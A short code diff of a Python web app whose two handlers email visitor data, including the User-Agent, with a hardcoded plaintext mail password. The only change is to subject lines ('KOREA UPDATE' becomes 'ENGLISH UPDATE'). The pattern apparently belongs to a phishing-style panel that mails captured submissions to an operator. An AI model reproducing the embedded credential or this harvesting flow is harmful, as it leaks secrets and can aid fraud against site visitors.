@@ -150,7 +150,7 @@ def first():
         password = "1RQoQkJC[l)l"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
-        message["Subject"] = "KOREA UPDATE ! 1"
+        message["Subject"] = "ENGLISH UPDATE ! 1"
         message["From"] = sender_email
         message["To"] = receiver_email
         text = """\
@@ -187,7 +187,7 @@ def second():
         password = "1RQoQkJC[l)l"
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart("alternative")
-        message["Subject"] = "KOREA UPDATE !! 2"
+        message["Subject"] = "ENGLISH UPDATE !! 2"
         message["From"] = sender_email
         message["To"] = receiver_email
         text = """\
